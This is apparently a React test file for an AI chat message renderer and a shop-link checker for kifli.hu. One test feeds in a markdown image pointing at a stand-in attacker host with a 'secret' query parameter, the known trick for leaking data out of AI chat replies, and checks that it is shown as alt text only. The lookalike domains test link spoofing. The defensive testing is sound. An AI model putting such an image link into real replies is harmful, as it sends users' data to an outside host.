import { render, screen } from "@testing-library/react"
import { describe, expect, it } from "vite-plus/test"
import { isShopLink, MessageResponse } from "@/components/ai-elements/message"

describe("MessageResponse", () => {
  it("renders an image's alt text instead of loading its URL", async () => {
    const { container } = render(
      <MessageResponse>{"Gulyás: ![a gulyás képe](https://evil.example/c?d=secret)"}</MessageResponse>,
    )
    expect(await screen.findByText("a gulyás képe")).toBeInTheDocument()
    expect(container.querySelector("img")).toBeNull()
  })
})

describe("isShopLink", () => {
  it.each([
    ["https://kifli.hu/termek/123", true],
    ["https://www.kifli.hu/kosar", true],
    ["http://kifli.hu", false],
    ["https://evilkifli.hu", false],
    ["https://kifli.hu.evil.example", false],
    ["/relative", false],
  ])("%s -> %s", (url, expected) => {
    expect(isShopLink(url)).toBe(expected)
  })
})
